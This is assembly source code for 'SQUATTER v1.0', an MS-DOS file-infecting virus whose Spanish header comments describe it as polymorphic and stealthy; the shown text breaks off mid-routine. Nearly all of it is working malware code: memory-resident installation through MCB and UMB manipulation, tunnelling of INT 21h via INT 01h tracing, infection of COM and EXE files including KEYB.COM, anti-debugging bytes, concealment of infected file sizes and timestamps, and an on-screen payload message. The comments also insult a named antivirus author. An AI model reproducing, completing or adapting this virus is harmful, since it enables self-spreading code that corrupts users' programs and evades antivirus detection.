   ;;; ÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝ
   ;;;ÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍ
   ;;; ÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝ
   ;;; ³³³³³³³³³³³³³³³³³³³³ÆÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏÏµ³³³³³³³³³³³³³³³³³³³³³³³³
   ;;; ³³³³³³³³³³³³³³³³³³³³³  S Q U A T T E R  v 1 . 0  ³³³³³³³³³³³³³³³³³³³³³³³³³
   ;;; ³³³³³³³³³³³³³³³³³³³³ÆÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑÑµ³³³³³³³³³³³³³³³³³³³³³³³³
   ;;; ÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝ
   ;;;ÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍÛÍ
   ;;; ÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝÞÝ
   ;;;
   ;;;; VIRUS POLIMORFICO Y STEALTH
   ;;;; Sta claro?

   ;; Lo que hace durante la instalaci¢n:
   ;; * Comprueba la versi¢n de DOS. Si el virus no est  en memoria, se ejecuta-
   ;;  r  normalmente. Si est , al retornar de la interrupci¢n se saltar  todo
   ;;  el proceso de instalaci¢n en memoria, retornando directamente a la etique-
   ;;  ta "@@FinInstalacion". Antes de hacer esto, comprueba si todo lo que si-
   ;;  gue al puntero de retorno (en el stack) es en realidad el virus (para evi-
   ;;  tar ciertos antivirus hechos por "expertos" que lo £nico que hacen para
   ;;  saber si un virus est  en memoria es llamar a los Install-Check conocidos
   ;;  - l‚ase un tal FluShot o Virex hecho por un gilipollas, adem s de lamer,
   ;;  llamado Ross M. Greenberg).
   ;; * Busca un UMB propicio para la instalaci¢n del virus en memoria.
   ;; * Traza la interrupci¢n 21h con ayuda de la int 01h.
   ;; * Intercambia las variables en memoria donde se guarda el puntero que sal-
   ;;  ta al £ltimo bloque de la int 21h (donde ha llegado trazando) por su pro-
   ;;  pio puntero, evitando parchear los 5 primeros bytes con un JMP XXXX:XXXX.
   ;; * Recupera los valores originales de ejecuci¢n inicial de los registros (un
   ;;  trabajito m s para mejorar su stealth).

   ;; Usando la interrupci¢n 21h, el virus es pr cticamente invisible al sistema.
   ;; Adem s, es un fast-infector.
   ;;  Las funciones de infecci¢n:
   ;;   * 3Eh  - Cerrar handle
   ;;   * 4Ch, 00h - Finalizar ejecuci¢n
   ;;   * 31h  - TSR
   ;;   * 43h  - Cambiar atributos
   ;;  Las funciones de stealth:
   ;;   * 11h, 12h - Buscar entradas de directorio (FCB)
   ;;   * 4Eh, 4Fh - Buscar entradas de directorio (Handle)
   ;;   * 23h  - Obtener tama¤o de archivo (FCB)
   ;;   * 3Dh, 6Ch - Abrir Handle
   ;;   * 3Fh  - Leer de un Handle
   ;;   * 40h  - Escribir en un Handle
   ;;   * 41h  - Borrar archivo (Handle)
   ;;   * 42h  - Mover puntero de un Handle
   ;;   * 4Bh  - Ejecutar programa
   ;;   * 57h  - Leer hora y fecha de un Handle
   ;;   * 25h  - Fijar vector de interrupci¢n
   ;;   * 35h  - Obtener vector de interrupci¢n
   ;;  Funciones internas del virus:
   ;;   * 30h  - Install-check (a prueba de lamers)
   ;;   * 1Ah  - Fijar nueva direcci¢n de DTA

   ;;; Existe un problema en las funciones 25h y 35h para el stealth. Resulta que
   ;; si quiero usar stealth aqu¡, me obliga a que, si por una de aquellas el vi-
   ;; rus falla en el trazado y hay que parchear la TVI, si un programa utiliza
   ;; las interrupciones del DOS para fijar su programa residente, ‚ste quedar 
   ;; por "debajo" del virus, es decir, que si fuera un programa antivirus lo pi-
   ;; llar¡a por banda. De todas maneras, es m s importante no retornar (en prin-
   ;; cipio) el vector de interrupci¢n v¡rico. Y, adem s, no creo que hayan dema-
   ;; siadas situaciones en las que tenga que parchear la TVI, ya que con el sim-
   ;; ple CS:JMP FAR [109E] que salta a la int 21h, sobra.

   ;;; Sin m s, disfruta de este nuevo engendro v¡rico, y espero que disfrutes y
   ;; aprendas m s leyendo este c¢digo (sin comentar :) que yo haci‚ndolo.

   ;;  The Mental Driller

   .MODEL TINY
   LOCALS
   .386
   .CODE

   LongVirus   EQU Offset FinVirus - Offset InicioVirus + 2
   LongVirusP  EQU ((LongVirus / 16) + 2) * 2 + 3Ah
   LongVirusP2 EQU (LongVirus / 16) + 16h
   LongVirus2  EQU LongVirus + 380
   LongCheck   EQU Offset FinChequeo - Offset InicioChequeo

       ORG 100h

   Main        PROC
           JMP   @@Inicio
           INT 21h
           DB  0FBh DUP (0)

   InicioVirus LABEL   WORD
   @@Inicio:   MOV SI, 200h
           PUSH    SI
           MOV BP, SP
           POP SI
           CMP [BP], SI
   Truco1      LABEL   WORD
           JNZ   @@CopiaVirus
           PUSH    DS
           PUSH    ES
           MOV AH, 30h
           INT 21h
   InicioChequeo   LABEL   WORD
           CMP AL, 05h
   Truco2      LABEL   WORD
           DB  0CDh, 03h
           JB    @@FinInstalacion

           MOV AX, CS:[SI+Truco1-200h]
           SUB AX, CS:[SI+Truco2-200h]
           SUB AX, 3E42h
           INT 2Fh
           MOV AH, BYTE PTR CS:[SI+Truco1-200h+1]
           SUB AH, 5
           CMP AL, AH
           DB  0CDh, 03h
           JNZ   @@PruebaporDOS
           MOV AX, 4310h
           INT 2Fh
           MOV CS:[SI+Puntero2-200h], BX
           MOV CS:[SI+Puntero2-200h+2], ES
           MOV AH, 10h
           MOV DX, 0FFFFh
           DB  0CDh, 03h
           CALL    DWORD PTR CS:[SI+Puntero2-200h]
           CMP AH, 0B0h
           JNZ   @@PruebaporDOS
           CMP DX, LongVirusP
           JB    @@PruebaporDOS
           MOV DX, LongVirusP
           MOV AH, 10h
           CALL    DWORD PTR CS:[SI+Puntero2-200h]
           OR  AX, AX
           JZ    @@PruebaporDOS
           PUSH    AX
           DEC AX
           MOV ES, AX
           MOV DI, 0008h
           MOV AX, 'CS'
           STOSW
           XOR AX, AX
           STOSW
           STOSW
           STOSW
           POP ES
           JMP   @@CopiaVirus

   @@PruebaporDOS: DB  0CDh, 03h
           MOV AX, 5800h
           INT 21h
           PUSH    AX
           MOV AX, 5801h
           MOV BX, 0081h      ;
           INT 21h
           JC    @@SeAcabo1
           MOV AX, 5802h
           INT 21h
           JC    @@SeAcabo1
           PUSH    AX
           MOV AX, WORD PTR CS:[SI+Offset @@PruebaporDOS-200h]
           XCHG    AH, AL
           MOV BX, AX
           SUB AH, 75h
           SUB BX, 0CD02h
           INT 21h
           JC    @@SeAcabo2
           MOV AH, 48h
           MOV BX, LongVirusP
           INT 21h
           JC    @@SeAcabo2
           CMP AX, 0A000h
           JNB   @@Sigue
           PUSH    AX
           DEC AX
           MOV ES, AX
           MOV WORD PTR ES:[0001], 0008
           JMP   @@Sigue4000
        @@Sigue:   PUSH    AX
           DEC AX
           MOV ES, AX
           MOV AX, 'CS'
           MOV DI, 0008h
           XOR AX, AX
           STOSW
           STOSW
           STOSW
     @@Sigue4000:  POP ES
           CLC
      @@SeAcabo2:  POP BX
           PUSHF
           MOV AX, 5803h
           XOR BH, BH
           INT 21h
           POPF
      @@SeAcabo1:  POP BX
           PUSHF
           MOV AX, 5801h
           INT 21h
           POPF
           JNC   @@CopiaVirus

   @@PorMCBs1: DB  0CDh, 03h
           MOV AX, DS
           DEC AX
           MOV ES, AX
           CMP BYTE PTR ES:[0000], 'Z'
           JNZ   @@FinInstalacion
           DB  0CDh, 03h
           MOV AX, WORD PTR CS:[SI+Offset @@PorMCBs1-200h]
           XOR AH, AH
           MOV DI, AX
           MOV BL, BYTE PTR CS:[SI+Truco1-200h]
           XOR BH, BH
           SUB WORD PTR ES:[DI], LongVirusP
           SUB WORD PTR ES:[DI+BX], LongVirusP
           MOV ES, ES:[DI+BX]
           MOV AX, ES
           DEC AX
           MOV DS, AX
           MOV BYTE PTR DS:[DI-03], 'Z'
           MOV WORD PTR DS:[DI-02], 0008h
           MOV WORD PTR DS:[DI], LongVirusP
   @@CopiaVirus:   PUSH    CS
           POP DS
           XOR DI, DI
           PUSH    SI
           MOV CX, LongVirus
           CLD
           CALL    RepMovsb
           DB  0CDh, 03h
           POP SI
           PUSH    ES
           POP DS
           MOV AX, 3521h
           INT 21h
           MOV [AntInt21h-200h], BX
           ADD BYTE PTR CS:[SI+Truco3-200h], 68h
   Truco3:     MOV [AntInt21h-200h+2], ES

           PUSH    CS
           LEA AX, [SI+Offset VuelvedeMem-200h]
           PUSH    AX
           PUSH    DS
           PUSH    Offset SaltoaMem-200h
           DB  0CDh, 03h
           RETF
   SaltoaMem   LABEL   WORD
           MOV BYTE PTR CS:[InstalacionPoli-200h], 0
           MOV AH, 2Fh
           INT 21h
           MOV [DirecDTA-200h], BX
           MOV [DirecDTA-200h+2], ES
           CALL    TrazaPorINT30h
           JNC   @@Sigue001
   @@TrazaPorINT01:
           MOV AX, 3501h
           INT 21h
           MOV WORD PTR [Ptr01-200h], BX
           MOV WORD PTR [Ptr01-200h+2], ES
           MOV EAX, DWORD PTR [AntInt21h-200h]
           MOV DWORD PTR [Puntero3-200h], EAX
           XOR AX, AX
           MOV ES, AX
           CLI
           MOV WORD PTR ES:[0004], Offset NewInt01h - 200h
           MOV WORD PTR ES:[0006], CS
           STI
           PUSHF
           POP AX
           OR  AH, 01h
           PUSH    AX
           POPF
           MOV AH, 30h
           PUSHF
           CALL    DWORD PTR [AntInt21h-200h]
           PUSHF
           POP AX
           AND AH, 0FEh
           PUSH    AX
           POPF
           MOV AX, WORD PTR CS:[Ptr01-200h]
           MOV BX, WORD PTR CS:[Ptr01-200h+2]
           CLI
           MOV WORD PTR ES:[0004], AX
           MOV WORD PTR ES:[0006], BX
           STI
   @@Sigue001: CALL    HazTunneling

   ;        LES     DI, DWORD PTR CS:[Puntero3-200h]
   ;        cli
   ;        cld
   ;        mov     ax, offset NewInt21h-200h
   ;        stosw
   ;        mov     ax, cs
   ;        stosw
   ;        sti
           MOV BYTE PTR CS:[BytesInt24h-200h], 0EAh
           MOV WORD PTR CS:[BytesInt24h-200h+1], Offset ProgramaInt24h-200h
           MOV WORD PTR CS:[BytesInt24h-200h+3], CS

           MOV AH, 1Ah
           CALL    Int21h
           PUSH    CS
           POP DS
           CMP DX, 0518h
           JZ  PayLoad
           MOV BYTE PTR [Desinfeccion-200h], 2
           RETF
   VuelvedeMem LABEL   WORD
   FinChequeo  LABEL   WORD
   @@FinInstalacion:
           POP ES
           POP DS
           CMP BYTE PTR CS:[SI+TipoEjec-200h], 01
           JZ    @@EsunEXE
      @@EsunCOM:   PUSH    CS
           MOV DI, 0100h
           PUSH    DI
           ADD SI, Offset Los3bytes-200h
           CLD
           MOVSW
           MOVSB
           MOV SI, DI
           SUB SI, +03
         @@Salll:  MOV DI, SP
           ADD DI, 0004
           XOR AX, AX
           XOR BX, BX
           MOV CX, 00FFh
           MOV DX, ES
           MOV BP, 091Ch
           RETF
      @@EsunEXE:   MOV AX, ES
           ADD AX, 0010h
           ADD WORD PTR CS:[SI+InicSS-200h], AX
           ADD WORD PTR CS:[SI+InicCS-200h], AX
           CLI
           MOV SS, CS:[SI+InicSS-200h]
           MOV SP, CS:[SI+InicSP-200h]
           STI
           PUSH    WORD PTR CS:[SI+InicCS-200h]
           MOV SI, CS:[SI+InicIP-200h]
           PUSH    SI
           JMP   @@Salll
   Main        ENDP

   Los3bytes   DB  0B8h, 00, 4Ch
   SaltoCOM    DB  0E9h, 00, 00
   InicIP      DW  0
   InicCS      DW  0
   InicSS      DW  0
   InicSP      DW  0
   AntInt21h   DW  2 DUP (0)

   Puntero2    DW  2 DUP (0)
   Puntero3    DW  2 DUP (0)

   RepMovsb    PROC
           PUSH    AX
      @@Loop01:    MOV AL, DS:[SI]
           MOV ES:[DI], AL
           DB  0CDh, 03h
           INC SI
           INC DI
           LOOP  @@Loop01
           POP AX
           RET
   RepMovsb    ENDP

   Basura4     dw  0

   TrazaporINT30h  PROC
           XOR AX, AX
           MOV ES, AX
           MOV BX, ES:[00C1h]
           MOV ES, ES:[00C3h]
           CMP WORD PTR ES:[BX], 9090h
           JNZ   @@SalconCARRY
           CMP BYTE PTR ES:[BX+2], 0E8h
           JNZ   @@SalconCARRY
           SUB BX, 0032h
           CMP WORD PTR ES:[BX], 9090h
           JNZ   @@SalconCARRY
           CMP BYTE PTR ES:[BX+2], 0E8h
           JNZ   @@SalconCARRY
           CMP WORD PTR ES:[BX+6], 2EFFh
           JNZ   @@SalconCARRY
           MOV BX, ES:[BX+08h]
           MOV WORD PTR CS:[Puntero3-200h], BX
           MOV WORD PTR CS:[Puntero3-200h+2], ES
           LES BX, ES:[BX]
           MOV WORD PTR CS:[AntInt21h-200h], BX
           MOV WORD PTR CS:[AntInt21h-200h+2], ES
           CLC
           RET
   @@SalconCARRY:  STC
           RET
   TrazaporINT30h  ENDP

   HazTunneling    PROC
           CLD
           MOV AH, 48h
           MOV BX, 0001
           INT 21h
           JC    @@Sigue
           DEC AX
           MOV ES, AX
           MOV DI, 0010h
           PUSH    DI
           MOV WORD PTR ES:[DI-0Fh], 0008h
           MOV AL, 0EAh
           STOSB
           MOV AX, Offset NewInt21h - 200h
           STOSW
           MOV AX, CS
           STOSW
           POP DI
           JMP   @@Sigue2
     @@Sigue:  PUSH    CS
           POP ES
           MOV DI, Offset NewInt21h - 200h
     @@Sigue2: LDS BX, DWORD PTR CS:[Puntero3-200h]
           CLI
           MOV [BX], DI
           MOV [BX+02], ES
           STI
           RET
   HazTunneling    ENDP

   Basura3     dw  0

   ;;;;;;; Nueva interrupci¢n 01h (para trazar interrupciones)

   NewInt01h   PROC
           PUSH    DX
           PUSH    AX
           PUSH    SI
           PUSH    DS
           PUSH    CX
           PUSH    BP
           XOR DL, DL
           MOV BP, SP
           MOV AX, [BP+0Eh]
           MOV CX, CS
           CMP AX, CX
           JZ    @@Fin1
           MOV DS, AX
           MOV SI, [BP+0Ch]
           CLD
           LODSB
           PUSH    SI
           CMP AL, 9Ch         ; PUSHF
           JNZ   @@Siguiendo1
           INC WORD PTR [BP+0Ch]
           MOV DL, 01
           JMP   @@Acaba
   @@Siguiendo1:   CMP AL, 9Dh         ; POPF
           JNZ   @@Siguiendo2
           OR  WORD PTR [BP+12h], 0100h
           JMP   @@Acaba
   @@Siguiendo2:   CMP AL, 0CFh        ; IRET
           JNZ   @@Siguiendo3
           OR  WORD PTR [BP+16h], 0100h
           JMP   @@Acaba
   @@Siguiendo3:   CMP AL, 2Eh         ; CS:
           JNZ   @@Siguiendo4
           LODSW
           JMP   @@Siguiendo5
   @@Siguiendo4:   XCHG    AH, AL
           LODSB
           XCHG    AH, AL
   @@Siguiendo5:   CMP AX, 2EFFh
           JZ    @@EsJMPFAR
           CMP AX, 1EFFh
           JZ    @@EsJMPFAR
           CMP AL, 0EAh
           JZ    @@EsJMP32
           CMP AL, 09Ah
           JNZ   @@Acaba
   @@EsJMP32:  DEC SI
           MOV CS:[Puntero2-200h], SI
           MOV CS:[Puntero2+2-200h], DS
           JMP   @@Acaba
   @@EsJMPFAR: LODSW
           MOV CS:[Puntero2-200h], AX
           MOV CS:[Puntero2+2-200h], DS

   @@Acaba:    POP SI
           MOV AX, DS
           CMP WORD PTR CS:[AntInt21h+2-200h], 0F000h
           JAE   @@Fin1
           CMP AX, WORD PTR CS:[AntInt21h+2-200h]
           JZ    @@Fin1
           CMP AX, 0F000h
           JAE   @@Salto
           CMP AX, WORD PTR CS:[AntInt21h+2-200h]
           JA    @@Fin1
    @@Salto:   DEC SI
           PUSH    AX
           MOV AX, CS:[Puntero2-200h]
           MOV CS:[Puntero3-200h], AX
           MOV AX, CS:[Puntero2+2-200h]
           MOV CS:[Puntero3+2-200h], AX
           POP AX
           MOV WORD PTR CS:[AntInt21h-200h], SI
           MOV WORD PTR CS:[AntInt21h+2-200h], AX
     @@Fin1:   POP BP
           POP CX
           POP DS
           POP SI
           POP AX
           CMP DL, 01
           JZ    @@Fin2
           POP DX
           IRET
     @@Fin2:   POP DX
           RETF
   NewInt01h   ENDP

   Basura1     dw  0

   Mensaje DB  0, "I've just squattered your system!!", 0Dh, 0Ah
   Mensaje2 DB  ' -  SQUATTER v1.0 - Coded by The Mental Driller', 0

   Basura2     dw  0

   Payload     PROC
           MOV AX, 0003
           INT 10h
           PUSH    CS
           POP DS
           MOV AX, 0B800h
           MOV ES, AX
     @@Premio: MOV AH, 15h
           MOV CX, 0037d
           MOV SI, Offset Mensaje - 200h
           MOV DI, 0006
       @@Loop1:    LODSB
           STOSW
           LOOP  @@Loop1

       @@Premio2:  PUSH    ES
           XOR AX, AX
           MOV ES, AX
           MOV AX, ES:[046Ch]
           ROL AX, 3
           XOR AX, ES:[046Ah]
           IN  AL, 40h
           POP ES
           AND AX, 0FFEh
           MOV DI, AX
           MOV CX, 0048d
           MOV SI, Offset Mensaje2 - 200h
       @@Loop2:    LODSB
           STOSW
           LOOP  @@Loop2
           JMP   @@Premio
   Payload     ENDP

   Basura5     dw  0

   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;;;; NUEVA INTERRUPCION 21h ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
   ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

   NewInt21h   PROC
           PUSH    BP
           PUSH    AX
           MOV BP, SP
           POP AX
           CMP AX, [BP]
           POP BP
           JZ    @@Continua001
           PUSH    BP
           RETF
   @@Continua001:  CMP AH, 30h
           JNZ   @@SigueInt

   @@InstallCheck: PUSHA
           PUSH    DS
           PUSH    ES
           MOV BP, SP
           LES DI, DWORD PTR SS:[BP+14h]
           PUSH    CS
           POP DS
           MOV SI, Offset InicioChequeo-200h
           MOV CX, LongCheck
           CLD
           REPZ    CMPSB
           JCXZ  @@CheckOK
           POP ES
           POP DS
           POPA
           JMP   @@FinInt21h
   @@CheckOK:  ADD WORD PTR [BP+14h], LongCheck
           POP ES
           POP DS
           POPA
           IRET

     @@SigueInt:   CMP AH, 4Ch
           JZ    @@Infecta
           OR  AH, AH
           JZ    @@Infecta
           CMP AH, 31h
           JZ    @@Infecta
           CMP AH, 1Ah
           JZ    @@NuevoDTA
           CMP AH, 3Eh
           JZ    @@InfectaHandle
           CMP AH, 43h
           JZ    @@InfectaAtributos
           CMP AH, 25h
           JZ    @@FijarVector
           CMP AH, 35h
           JZ    @@ObtenerVector
           CMP AX, 5701h
           JZ    @@HoraFechaHandle
           CMP BYTE PTR CS:[NoStealth-200h], 1
           JZ    @@FinInt21h
           CMP AH, 10h
           JBE   @@Salto0001
           CMP AH, 13h
           JB    @@StealthDIR
   @@Salto0001:    CMP AH, 4Dh
           JBE   @@Salto0002
           CMP AH, 50h
           JB    @@StealthDIR
   @@Salto0002:    CMP AH, 4Ah
           JBE   @@Salto0000
           CMP AH, 4Ch
           JB    @@DesinfectaHandle
   @@Salto0000:    CMP AH, 3Dh
           JZ    @@DesinfectaHandle
           CMP AH, 6Ch
           JZ    @@DesinfectaHandle
           CMP AH, 41h
           JZ    @@DesinfectaHandle
           CMP AH, 40h
           JZ    @@EscribeHandle
           CMP AX, 5700h
           JZ    @@HoraFechaHandle
           CMP AH, 3Fh
           JZ    @@LeeHandle
           CMP AH, 42h
           JZ    @@StealthPuntero
           CMP AH, 23h
           JZ    @@TamanyoArchivoFCB
     @@FinInt21h:  JMP DWORD PTR CS:[AntInt21h-200h]

   RutaKEYB    DB  'C:\DOS\KEYB.COM', 0
   Basura6     dw  0

   @@InfectaKEYB:  PUSH    CS
           POP DS
           MOV DX, Offset RutaKEYB-200h
           JMP   @@SigueInfec02
   @@InfectaHandle:
           PUSHA
           PUSH    DS
           PUSH    ES
           CALL    ParcheaInt24h
           CMP BX, 0004
           JBE   @@Fin00
           MOV AH, 35h
           CALL    Int21h
           JC    @@Fin00
           MOV BX, AX
           JMP   @@SigueInfec01
   @@InfectaAtributos:
     @@Infecta:    PUSHA
           PUSH    DS
           PUSH    ES
           CALL    ParcheaInt24h
           CMP AH, 43h
           JZ    @@SigueInfec02
           CALL    ObtenNombre
           CMP BYTE PTR CS:[Desinfeccion-200h], 0
           JZ    @@SigueInfec02
           DEC BYTE PTR CS:[Desinfeccion-200h]
           JZ    @@InfectaKEYB
           JMP   @@Siguiente    ; (En la rutina de desinfecci¢n)
   @@SigueInfec02: CALL    BorraDATs
           MOV AX, 2D00h
           CALL    Int21h
           JC    @@Fin00
           MOV BX, AX
   @@SigueInfec01: CALL    FakeHandle
           CALL    OperaHandle
           JC    @@Fin01
           PUSH    DS
           POP ES
           PUSH    CS
           POP DS
           MOV AX, 4700h
           CALL    Int21h
           MOV [Hora-200h], CX
           MOV [Fecha-200h], DX
           MOV AH, 1Ah
           CALL    Int21h
           SUB CX, 01980d
           ROR CX, 7
           PUSH    DX
           XOR DH, DH
           OR  CX, DX
           POP DX
           XOR DL, DL
           ROR DX, 3
           OR  CX, DX
           SUB CX, [Fecha-200h]
           JZ    @@Fin01
           DEC CX
           JZ    @@Fin01
           CALL    CompruebaNombre
           JC    @@Fin01
           CALL    CambiaAtributos
           CALL    LeeCabecera
           JC    @@Fin02
           PUSH    SI
           PUSH    DI
           PUSH    ES
           PUSH    CS
           POP ES
           MOV DI, Offset Cabecera2-200h
           MOV CX, 0018h
           CALL    RepMovsb
           POP ES
           POP DI
           POP SI
           MOV AX, [SI]
           CMP AX, 4CB4h
           JZ    @@Fin02
           CMP AL, 0B8h
           JNZ   @@Siguuuu
           CMP BYTE PTR [SI+02], 4Ch
           JZ    @@Fin02
    @@Siguuuu: CMP AL, 0E9h
           JNZ   @@Continua002
           MOV CL, BYTE PTR CS:[Hora-200h]
           AND CL, 1Fh
           CMP CL, 1Eh
           JZ    @@Fin02
    @@Continua002: ADD AX, 0B2A6h
           JZ    @@InfectaEXE
           CMP AX, 0CF3h
           JZ    @@InfectaEXE
   @@InfectaCOM:   MOV BYTE PTR [TipoEjec-200h], 0
           MOV AX, [SI]
           MOV WORD PTR [Los3bytes-200h], AX
           MOV AL, BYTE PTR [SI+2]
           MOV BYTE PTR [Los3bytes-200h+2], AL
           CALL    PtrFinal
           OR  DX, DX
           JNZ   @@Fin02
           CMP AX, 1000h
           JB    @@Fin02
           CMP AX, 0E000h
           JA    @@Fin02
           ADD AX, 0100h
           MOV WORD PTR [InicioVirus-200h+1], AX
           SUB AX, 0103h
           PUSH    AX
           CALL    HazVirus
           POP AX
           OR  CX, CX
           JZ    @@Fin02
           ADD AX, DX
           MOV WORD PTR [SaltoCOM-200h+1], AX
           MOV DX, Offset NewVirus-200h
           PUSH    CS
           POP DS
           MOV AH, 30h
           CALL    Int21h
           JC    @@Fin02
           CALL    PtrInicio
           MOV DX, Offset SaltoCOM-200h
           MOV CX, 0003
           MOV AH, 30h
           CALL    Int21h
           JZ    @@Fin02
         @@Fin03:  AND BYTE PTR [Hora-200h], 0E0h
           OR  BYTE PTR [Hora-200h], 1Eh
         @@Fin02:  MOV AX, 4701h
           MOV CX, CS:[Hora-200h]
           MOV DX, CS:[Fecha-200h]
           CALL    Int21h
           CALL    RestauraAtributos
         @@Fin01:  CALL    UnfakeHandle
         @@Fin00:  CALL    ParcheaInt24h
           POP ES
           POP DS
           POPA
           CMP AH, 3Eh
           JZ    @@SEUUF
           CMP AH, 43h
           JZ    @@FinInt21h
           MOV BYTE PTR CS:[NoStealth-200h], 0
           JMP   @@FinInt21h
        @@SEUUF:   CALL    ParcheaInt24h
           SUB AH, 10h
           CALL    Int21h
           PUSHF
           CALL    ParcheaInt24h
           POPF
           RETF    0002

   Basura7     dw  0

   @@InfectaEXE:   MOV BYTE PTR [TipoEjec-200h], 1
           MOV EAX, DWORD PTR [SI+14h]
           MOV DWORD PTR [InicIP-200h], EAX
           MOV EAX, DWORD PTR [SI+0Eh]
           MOV DWORD PTR [InicSS-200h], EAX
           MOV AX, [SI+12h]
           XOR AX, [SI+14h]
           CMP AX, 'MD'
           JZ    @@Fin03
           CALL    PtrFinal
           MOV CX, 200h
           DIV CX
           OR  DX, DX
           JZ    @@Salto001
           INC AX
   @@Salto001: CMP AX, [SI+04]
           JNZ   @@Fin02
           CMP DX, [SI+02]
           JNZ   @@Fin02
           CALL    PtrFinal
           CMP DX, 06h
           JA    @@Fin02
           OR  DX, DX
           JNZ   @@Salto002
           CMP AX, 1000h
           JB    @@Fin02
   @@Salto002: PUSH    AX
           PUSH    DX
           ADD AX, LongVirus2
           ADC DX, +00
           MOV CX, 200h
           DIV CX
           OR  DX, DX
           JZ    @@Salto003
           INC AX
   @@Salto003: MOV [SI+04], AX
           MOV [SI+02], DX
           POP DX
           POP AX
           MOV CX, 0010h
           DIV CX
           SUB AX, [SI+08h]
           JBE   @@Fin02
           MOV [SI+16h], AX
           PUSH    AX
           MOV WORD PTR [Offset InicioVirus-200h+1], DX
           PUSH    DX
           CALL    HazVirus
           POP AX
           OR  CX, CX
           JZ    @@Fin02
           ADD AX, DX
           MOV [SI+14h], AX
           POP AX
           ADD AX, (LongVirus2 / 16) + 6
           XOR DX, DX
           MOV [SI+0Eh], AX
           MOV [SI+10h], DX
           MOV DX, Offset NewVirus-200h
           MOV AH, 30h
           CALL    Int21h
           JC    @@Fin02
           CALL    PtrInicio
           MOV AX, 'MD'
           XOR AX, [SI+14h]
           MOV [SI+12h], AX
           MOV AH, 30h
           MOV CX, 0018h
           MOV DX, SI
           CALL    Int21h
           JC    @@Fin02
           JMP   @@Fin03

   Basura8     dw  0

   ;;; CAMBIO DE DIRECCION DEL DTA

   @@NuevoDTA: MOV WORD PTR CS:[DirecDTA-200h], DX
           MOV WORD PTR CS:[DirecDTA-200h+2], DS
           JMP   @@FinInt21h

   ;;; STEALTH DE DIRECTORIO

   @@StealthDIR:   MOV BYTE PTR CS:[Estado-200h], AH
           CLC
           SUB AH, 10h
           CALL    Int21h
           PUSHF
           PUSHA
           PUSH    DS
           PUSH    ES
           JC    @@FinStealthDIR
           LDS BX, DWORD PTR CS:[DirecDTA-200h]
           CMP BYTE PTR CS:[Estado-200h], 12h
           JBE   @@Stealth1001
   @@Stealth2001:  MOV SI, 0FFFFh
           MOV DI, 0FFFDh
           JMP   @@StealthX001
   @@Stealth1001:  INC AL
           JZ    @@FinStealthDIR
           XOR SI, SI
           XOR DI, DI
           CMP BYTE PTR [BX], 0FFh
           JNZ   @@StealthX001
           ADD BX, +07
   @@StealthX001:  ADD BX, 0017h
           MOV AL, BYTE PTR [BX+SI]
           AND AL, 1Fh
           CMP AL, 1Eh
           JNZ   @@FinStealthDIR
           CMP WORD PTR [BX+DI+08], +00
           JNZ   @@StealthX002
           CMP WORD PTR [BX+DI+06], (LongVirus2 + 1000h)
           JB    @@FinStealthDIR
   @@StealthX002:  MOV AX, WORD PTR [BX+SI]
           AND AX, 1FE0h
           ROR AX, 5
           ADD AX, LongVirus2
           SUB WORD PTR [BX+DI+06], AX
           SBB WORD PTR [BX+DI+08], +00
           MOV AL, BYTE PTR [BX+SI+01]
           AND AL, 1Eh
           AND BYTE PTR [BX+SI], 0E0h
           OR  BYTE PTR [BX+SI], AL
     @@FinStealthDIR:
           POP ES
           POP DS
           POPA
           POPF
           RETF    0002

   Basura9     dw  0

   ;;; DESINFECSION DE POGRAMAS QE SE HAVREN

   @@DesinfectaHandle:
           PUSHA
           PUSH    DS
           PUSH    ES
           CALL    ParcheaInt24h
           CMP AH, 6Ch
           JNZ   @@Siguiente
           MOV DX, SI
     @@Siguiente:  MOV BP, AX
           CALL    BorraDATs
           MOV AX, 2D00h
           CALL    Int21h
           JC    @@FinX00
           MOV BX, AX
           CALL    FakeHandle
           CALL    GetSFT
           JC    @@FinX01
        @@KKVH:    MOV AX, BP
           CMP AH, 4Bh
           JNZ   @@KKVI
           CALL    MirarsiStealth
        @@KKVI:    TEST    BYTE PTR ES:[DI+05], 80h
           JNZ   @@FinX02
           CALL    CambiaAtributos
           MOV AX, 4700h
           CALL    Int21h
           PUSH    CS
           POP DS
           MOV [Hora-200h], CX
           MOV [Fecha-200h], DX
           CALL    LeeCabecera
